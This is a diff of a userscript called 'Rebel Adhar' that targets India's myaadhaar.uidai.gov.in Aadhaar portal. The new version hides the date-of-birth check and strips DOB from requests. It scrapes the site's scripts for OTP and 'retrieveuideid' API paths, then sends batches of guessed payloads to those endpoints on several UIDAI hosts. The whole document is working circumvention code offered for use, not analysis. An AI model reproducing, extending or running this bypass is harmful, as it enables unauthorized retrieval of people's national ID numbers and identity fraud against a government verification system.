@@ -1,8 +1,8 @@
 // ==UserScript==
 // @name         Rebel Adhar
 // @namespace    https://github.com/ujjwalrebel53-wq/SpinPlay99
-// @version      11.0.0
-// @description  Rebel Adhar v11 — DOB bypass + OTP pipeline (NO fake date)
+// @version      11.1.0
+// @description  Rebel Adhar v11.1 — native OTP pass-through + retrieveuideid API
 // @match        https://myaadhaar.uidai.gov.in/*
 // @match        https://*.uidai.gov.in/*
 // @grant        none
@@ -22,7 +22,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '11.0.0';
+  const ENGINE_VERSION = '11.1.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -586,11 +586,56 @@
     return deepInvokeOtp(btn, log);
   }
 
+  function readFieldVal(type) {
+    for (const f of getMatFields()) {
+      if (classifyField(f) === type) return readInputVal(f.input);
+    }
+    return '';
+  }
+
+  function getCaptchaMeta() {
+    let id = '';
+    let txn = '';
+    qAll('input[type="hidden"]').forEach((inp) => {
+      const n = norm(inp.name || inp.id || inp.getAttribute('formcontrolname') || '');
+      const v = readInputVal(inp);
+      if (!v) return;
+      if (/captcha.*id|captchaid|cid|txn/i.test(n)) id = v;
+      if (/captcha.*txn|transaction/i.test(n)) txn = v;
+    });
+    qAll('img').forEach((img) => {
+      const src = img.src || '';
+      if (!/captcha|kaptcha|verify/i.test(src)) return;
+      const m = src.match(/[?&](?:id|txn|token|sid|key)=([^&]+)/i);
+      if (m) id = decodeURIComponent(m[1]);
+    });
+    return { id, txn };
+  }
+
+  function getRetrieveReqType() {
+    const radios = qAll('mat-radio-button, input[type="radio"]');
+    for (const r of radios) {
+      const input = r.querySelector?.('input[type="radio"]') || (r.type === 'radio' ? r : null);
+      const checked =
+        r.classList?.contains('mat-mdc-radio-checked') ||
+        r.classList?.contains('mat-radio-checked') ||
+        input?.checked;
+      if (!checked) continue;
+      const text = norm(r.textContent || r.getAttribute('aria-label') || '');
+      if (/eid|enrol/i.test(text)) return 'EID';
+      if (/uid|aadhaar/i.test(text)) return 'UID';
+    }
+    const blob = norm(document.body?.innerText || '').slice(0, 600);
+    if (/enrolment\s*(id|number)|\beid\b/i.test(blob) && !/aadhaar\s*number|\buid\b/i.test(blob)) return 'EID';
+    return 'UID';
+  }
+
   function buildOtpPayload(uiSel) {
-    const snap = getFieldSnapshot(uiSel);
-    const name = snap.find((f) => f.type === 'name')?.val || '';
-    const mobile = snap.find((f) => f.type === 'mobile')?.val || '';
-    const captcha = snap.find((f) => f.type === 'captcha')?.val || '';
+    const name = readFieldVal('name');
+    const mobile = readFieldVal('mobile');
+    const captcha = readFieldVal('captcha');
+    const meta = getCaptchaMeta();
+    const reqType = getRetrieveReqType();
     return {
       name,
       fullName: name,
@@ -601,37 +646,103 @@
       captcha,
       captchaCode: captcha,
       captchaValue: captcha,
+      captchaId: meta.id,
+      captchaTxnId: meta.txn || meta.id,
       verifyVia: 'mobile',
       verificationType: 'mobile',
       otpType: 'mobile',
+      reqType,
+      retrieveType: reqType,
+      requestType: reqType,
+      emailId: '',
+      email: '',
     };
+  }
+
+  function buildRetrievePayloads(uiSel) {
+    const d = buildOtpPayload(uiSel);
+    const isEid = d.reqType === 'EID';
+    const uidType = isEid ? 'EID' : 'UID';
+    const list = [
+      {
+        fullName: d.name,
+        mobileNo: d.mobile,
+        emailId: '',
+        captcha: d.captcha,
+        captchaId: d.captchaId,
+        requestType: uidType,
+        action: 'GENERATE_OTP',
+      },
+      {
+        fullName: d.name,
+        mobileNo: d.mobile,
+        captchaValue: d.captcha,
+        captchaTxnId: d.captchaTxnId,
+        retrieveType: uidType,
+        otpChannel: 'M',
+      },
+      {
+        name: d.name,
+        mobile: d.mobile,
+        captcha: d.captcha,
+        captchaId: d.captchaId,
+        uid: isEid ? '' : undefined,
+        eid: isEid ? '' : undefined,
+        reqType: uidType,
+      },
+      {
+        FullName: d.name,
+        MobileNo: d.mobile,
+        EmailID: '',
+        Captcha: d.captcha,
+        CaptchaId: d.captchaId,
+        ReqType: isEid ? 'E' : 'U',
+      },
+      d,
+    ];
+    const seen = new Set();
+    return list.filter((b) => {
+      const k = JSON.stringify(b);
+      if (seen.has(k)) return false;
+      seen.add(k);
+      return true;
+    });
   }
 
   async function scrapeChunkEndpoints(log) {
     const found = new Set();
-    const re = /["'](\/[a-zA-Z0-9_\-./]*(?:otp|OTP|generate|retrieve|send|login)[a-zA-Z0-9_\-./]*)["']/g;
-    qAll('script:not([src])').forEach((s) => {
+    const pathRe = /["'](\/[a-zA-Z0-9_\-./]*(?:otp|OTP|generate|retrieve|uideid|send|login)[a-zA-Z0-9_\-./]*)["']/g;
+    const urlRe = /["'](https?:\/\/[^"']*(?:retrieve|uideid|otp|myaadhaar|uidai)[^"']*)["']/gi;
+    function scanText(text) {
+      if (!text) return;
       let m;
-      while ((m = re.exec(s.textContent || ''))) {
+      while ((m = pathRe.exec(text))) {
         if (m[1].length < 120) found.add(m[1]);
       }
-    });
+      while ((m = urlRe.exec(text))) {
+        if (m[1].length < 160) found.add(m[1]);
+      }
+    }
+    qAll('script:not([src])').forEach((s) => scanText(s.textContent));
     const srcs = [...document.querySelectorAll('script[src]')]
       .map((s) => s.src)
       .filter((u) => u && /myaadhaar|uidai|main|chunk|polyfills|runtime|scripts/i.test(u));
-    for (const url of srcs.slice(0, 10)) {
+    for (const url of srcs.slice(0, 12)) {
       try {
-        const text = await fetch(url, { credentials: 'omit' }).then((r) => r.text());
-        let m;
-        while ((m = re.exec(text))) {
-          if (m[1].length < 120) found.add(m[1]);
-        }
+        scanText(await fetch(url, { credentials: 'omit' }).then((r) => r.text()));
       } catch (_e) {}
     }
-    const list = [...found].slice(0, 20);
+    const list = rankOtpPaths([...found]).slice(0, 24);
     if (list.length) log?.('info', 'Scraped API paths', list);
     return list;
   }
+
+  const PRIORITY_OTP_PATHS = [
+    '/generic/retrieveuideid',
+    '/api/generic/retrieveuideid',
+    '/generic/retrieveuideid/generateOtp',
+    '/generic/retrieveuideid/sendOtp',
+  ];
 
   const DEFAULT_OTP_PATHS = [
     '/auth/login/generateOTP',
@@ -646,46 +757,119 @@
     '/sso/login/generateOtp',
   ];
 
+  function rankOtpPaths(extraPaths) {
+    const all = [...PRIORITY_OTP_PATHS, ...(extraPaths || []), ...DEFAULT_OTP_PATHS];
+    const score = (p) => {
+      const s = String(p || '');
+      if (/retrieveuideid/i.test(s)) return 0;
+      if (/\/generic\/retrieve/i.test(s)) return 1;
+      if (/otp|generate/i.test(s) && /retrieve|uideid/i.test(s)) return 2;
+      if (/otp|generate/i.test(s)) return 4;
+      if (/\/send-metrics|retrieve-eid-uid$/i.test(s)) return 99;
+      return 8;
+    };
+    return [...new Set(all.filter((p) => p && p.length > 3))].sort((a, b) => score(a) - score(b));
+  }
+
+  function otpUrlBases(path) {
+    if (/^https?:\/\//i.test(path)) return [''];
+    return [
+      location.origin,
+      'https://myaadhaar.uidai.gov.in',
+      'https://tathya.uidai.gov.in',
+      'https://api.myaadhaar.uidai.gov.in',
+    ];
+  }
+
+  function resolveOtpUrl(base, path) {
+    if (/^https?:\/\//i.test(path)) return path;
+    return base + path;
+  }
+
+  async function postOtpTry(url, body, contentType, log) {
+    const stripped = stripDobFromBody(typeof body === 'string' ? body : body);
+    let payload = stripped.body;
+    if (payload != null && typeof payload !== 'string' && !(payload instanceof FormData) && !(payload instanceof URLSearchParams)) {
+      payload = JSON.stringify(payload);
+    }
+    const headers = {
+      Accept: 'application/json, text/plain, */*',
+      'Content-Type': contentType,
+      'X-Requested-With': 'XMLHttpRequest',
+    };
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers,
+        body: payload,
+        credentials: 'include',
+      });
+      const text = await res.text().catch(() => '');
+      const important = /retrieveuideid|retrieve|otp|generic/i.test(url);
+      if (important || (res.status !== 404 && res.status !== 405)) {
+        log?.('info', 'Direct OTP API', {
+          url: url.slice(0, 110),
+          status: res.status,
+          resp: text.slice(0, 120),
+        });
+      }
+      if (res.ok || res.status === 200 || /otp.*sent|success|txn|transaction/i.test(text)) return true;
+      if (res.status >= 200 && res.status < 300 && text && !/error|invalid|fail/i.test(text.slice(0, 80))) return true;
+    } catch (err) {
+      log?.('warn', 'Direct OTP fetch error', { url: url.slice(0, 80), err: String(err).slice(0, 60) });
+    }
+    return false;
+  }
+
   async function directOtpRequest(uiSel, log, extraPaths) {
-    const data = buildOtpPayload(uiSel);
-    if (!data.mobile || !data.captcha) {
-      log?.('warn', 'Direct OTP skip — mobile/captcha missing');
+    const bodies = buildRetrievePayloads(uiSel);
+    const sample = bodies[0] || {};
+    if (!sample.mobile && !sample.mobileNo && !sample.MobileNo) {
+      log?.('warn', 'Direct OTP skip — mobile missing');
       return false;
     }
-    const paths = [...new Set([...(extraPaths || []), ...DEFAULT_OTP_PATHS])];
-    const bases = [location.origin, 'https://myaadhaar.uidai.gov.in'];
-    const bodies = [
-      data,
-      { fullName: data.name, mobileNo: data.mobile, captcha: data.captcha },
-      { name: data.name, mobileNumber: data.mobile, captchaValue: data.captcha },
-    ];
-    for (const base of bases) {
-      for (const path of paths) {
-        if (!path || path.length < 4) continue;
-        const url = path.startsWith('http') ? path : base + path;
+    if (!sample.captcha && !sample.captchaValue && !sample.Captcha) {
+      log?.('warn', 'Direct OTP skip — captcha missing');
+      return false;
+    }
+    const paths = rankOtpPaths(extraPaths);
+    log?.('info', 'Direct OTP try', { paths: paths.slice(0, 6), reqType: getRetrieveReqType() });
+
+    for (const path of paths) {
+      for (const base of otpUrlBases(path)) {
+        const url = resolveOtpUrl(base, path);
         for (const body of bodies) {
-          const stripped = stripDobFromBody(JSON.stringify(body));
-          const payload = typeof stripped.body === 'string' ? stripped.body : JSON.stringify(stripped.body);
-          try {
-            const res = await fetch(url, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/plain, */*' },
-              body: payload,
-              credentials: 'include',
-            });
-            if (res.status === 404 || res.status === 405) continue;
-            const text = await res.text().catch(() => '');
-            log?.('info', 'Direct OTP API', { url: url.slice(0, 100), status: res.status, resp: text.slice(0, 100) });
-            if (res.ok) return true;
-          } catch (_e) {}
+          const cleanBody = stripDobFromBody(body).body;
+          if (await postOtpTry(url, cleanBody, 'application/json', log)) return true;
+          const params = new URLSearchParams();
+          const src = typeof cleanBody === 'object' && cleanBody && !Array.isArray(cleanBody) ? cleanBody : body;
+          Object.entries(src || {}).forEach(([k, v]) => {
+            if (v != null && v !== '') params.append(k, String(v));
+          });
+          if (params.toString() && (await postOtpTry(url, params.toString(), 'application/x-www-form-urlencoded', log))) {
+            return true;
+          }
         }
       }
     }
     return false;
   }
 
-  async function invokeOtpPipeline(btn, uiSel, log, netBefore) {
-    await advancedBypassAsync(uiSel, log);
+  function runInAngularZone(fn) {
+    try {
+      const root = document.querySelector('app-root, [ng-version]') || document.body;
+      if (typeof window.ng?.getInjector === 'function') {
+        const inj = window.ng.getInjector(root);
+        const Zone = inj.get?.('NgZone') || inj.get?.(window.ng?.core?.NgZone);
+        if (Zone?.run) return Zone.run(fn);
+      }
+    } catch (_e) {}
+    fn();
+  }
+
+  async function invokeOtpPipeline(btn, uiSel, log, netBefore, opts) {
+    opts = opts || {};
+    if (!opts.skipPrep) await advancedBypassAsync(uiSel, log);
     const prep = buildSubmitState(uiSel, log);
     if (!prep.dobBypassed) {
       log?.('error', 'DOB bypass fail', prep);
@@ -696,18 +880,19 @@
       return { ok: false, prep };
     }
 
-    log?.('info', 'OTP pipeline start', { v: ENGINE_VERSION });
+    log?.('info', 'OTP pipeline start', { v: ENGINE_VERSION, skipNative: !!opts.skipNative });
 
-    enableOtpButtons();
-    try {
-      btn.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
-    } catch (_e) {}
-    try {
-      btn.click();
-    } catch (_e2) {}
-    await waitMs(2200);
-    if (typeof netBefore === 'function' && netBefore()) {
-      return { ok: true, prep, via: 'native-click' };
+    if (!opts.skipNative) {
+      enableOtpButtons();
+      runInAngularZone(() => {
+        try {
+          btn.click();
+        } catch (_e) {}
+      });
+      await waitMs(2200);
+      if (typeof netBefore === 'function' && netBefore()) {
+        return { ok: true, prep, via: 'native-click' };
+      }
     }
 
     forceSubmitOtp(btn, log);
@@ -743,12 +928,12 @@
     const form = btn.closest('form');
     if (form?.requestSubmit) {
       try {
-        form.requestSubmit(btn);
+        runInAngularZone(() => form.requestSubmit(btn));
         log?.('info', 'OTP force — form.requestSubmit');
         return true;
       } catch (_e) {}
     }
-    simulateClick(btn);
+    runInAngularZone(() => simulateClick(btn));
     log?.('info', 'OTP force — button click');
     return true;
   }
@@ -1521,6 +1706,9 @@
     isDobDisabled,
     dobFieldVisible,
     apply,
+    buildSubmitState,
+    buildOtpPayload,
+    buildRetrievePayloads,
     prepareSubmit,
     prepareSubmitAsync,
     ensureDobBypassed,
@@ -1717,60 +1905,92 @@
 
   var skipOtpHook = false;
   var otpRunning = false;
+  var otpFallbackTimer = null;
+
+  function isOtpBtn(el) {
+    if (!el) return null;
+    const btn = el.closest?.('button,[role="button"],a,input[type="submit"]');
+    if (!btn) return null;
+    const t = E.norm(btn.textContent || btn.value || '');
+    if (!t.includes('send otp') && !t.includes('request otp')) return null;
+    return btn;
+  }
+
+  function runOtpFallback(btn, before) {
+    if (netCount > before) return;
+    log('warn', 'Native OTP fail — pipeline retry');
+    skipOtpHook = true;
+    const run = E.invokeOtpPipeline
+      ? E.invokeOtpPipeline(btn, UI_SEL, log, function () { return netCount > before; }, { skipNative: true })
+      : Promise.resolve({ ok: false });
+    Promise.resolve(run)
+      .then(function (result) {
+        if (result && result.ok) {
+          log('info', 'OTP sent', { via: result.via || 'pipeline', v: E.ENGINE_VERSION || '11.1' });
+          return;
+        }
+        if (netCount <= before) {
+          log('error', 'NO API CALL — v' + (E.ENGINE_VERSION || '?') + ' Copy Debug bhejo');
+          if (E.getFormDiagnostics) log('info', 'Debug', E.getFormDiagnostics(UI_SEL));
+        }
+      })
+      .finally(function () {
+        otpRunning = false;
+        setTimeout(function () { skipOtpHook = false; }, 400);
+      });
+  }
 
   function watchOtp() {
     if (window.__rebelOtp83) return;
     window.__rebelOtp83 = true;
 
-    document.addEventListener('click', function (e) {
-      if (!on || skipOtpHook || otpRunning) return;
-      const btn = e.target?.closest?.('button,[role="button"],a,input[type="submit"]');
-      if (!btn) return;
-      const t = E.norm(btn.textContent || btn.value || '');
-      if (!t.includes('send otp') && !t.includes('request otp')) return;
+    document.addEventListener('pointerdown', function (e) {
+      if (!on || skipOtpHook) return;
+      if (!isOtpBtn(e.target)) return;
+      E.prepareSubmit(UI_SEL, log);
+    }, true);
 
-      e.preventDefault();
-      e.stopImmediatePropagation();
+    document.addEventListener('click', function (e) {
+      if (!on || skipOtpHook) return;
+      const btn = isOtpBtn(e.target);
+      if (!btn) return;
+
+      const prep = E.prepareSubmit(UI_SEL, log);
+      if (!prep.dobBypassed) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        log('error', 'DOB bypass fail — Bypass DOB dabao', { dobInForm: prep.dobInForm });
+        return;
+      }
+      if (!prep.formOk) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        log('error', 'Pehle naam + mobile + captcha bharo', prep.after);
+        return;
+      }
+
+      if (otpRunning) return;
 
       const before = netCount;
       otpNetWatch = true;
       setTimeout(function () { otpNetWatch = false; }, 15000);
 
+      log('info', 'OTP send native pass-through', { v: E.ENGINE_VERSION || '11.1' });
+
       otpRunning = true;
-      skipOtpHook = true;
+      if (otpFallbackTimer) clearTimeout(otpFallbackTimer);
+      otpFallbackTimer = setTimeout(function () {
+        otpFallbackTimer = null;
+        runOtpFallback(btn, before);
+      }, 4500);
 
-      const run =
-        E.invokeOtpPipeline
-          ? E.invokeOtpPipeline(btn, UI_SEL, log, function () {
-              return netCount > before;
-            })
-          : (E.prepareSubmitAsync ? E.prepareSubmitAsync(UI_SEL, log) : Promise.resolve(E.prepareSubmit(UI_SEL, log))).then(
-              function (prep) {
-                if (!prep.dobBypassed) return { ok: false, prep };
-                if (!prep.formOk) return { ok: false, prep };
-                if (E.forceSubmitOtp) E.forceSubmitOtp(btn, log);
-                else btn.click();
-                return { ok: netCount > before, prep };
-              }
-            );
-
-      Promise.resolve(run)
-        .then(function (result) {
-          if (result && result.ok) {
-            log('info', 'OTP sent', { via: result.via || 'pipeline', v: E.ENGINE_VERSION || '11.0' });
-            return;
-          }
-          if (netCount <= before) {
-            log('error', 'NO API CALL — v' + (E.ENGINE_VERSION || '?') + ' Copy Debug bhejo');
-            if (E.getFormDiagnostics) log('info', 'Debug', E.getFormDiagnostics(UI_SEL));
-          }
-        })
-        .finally(function () {
+      setTimeout(function () {
+        if (netCount > before) {
+          if (otpFallbackTimer) clearTimeout(otpFallbackTimer);
           otpRunning = false;
-          setTimeout(function () {
-            skipOtpHook = false;
-          }, 400);
-        });
+          log('info', 'OTP sent', { via: 'native', v: E.ENGINE_VERSION || '11.1' });
+        }
+      }, 5000);
     }, true);
   }
 
@@ -1778,7 +1998,7 @@
     ensureUI();
     installNet();
     watchOtp();
-    log('info', 'Rebel Adhar v' + (E.ENGINE_VERSION || '11.0') + ' ON — DOB bypass shuru');
+    log('info', 'Rebel Adhar v' + (E.ENGINE_VERSION || '11.1') + ' ON — DOB bypass shuru');
     const ready = await E.waitForForm(30000);
     if (!ready) { log('warn', 'Form timeout — page reload karo'); return; }
     await E.apply(UI_SEL, log);
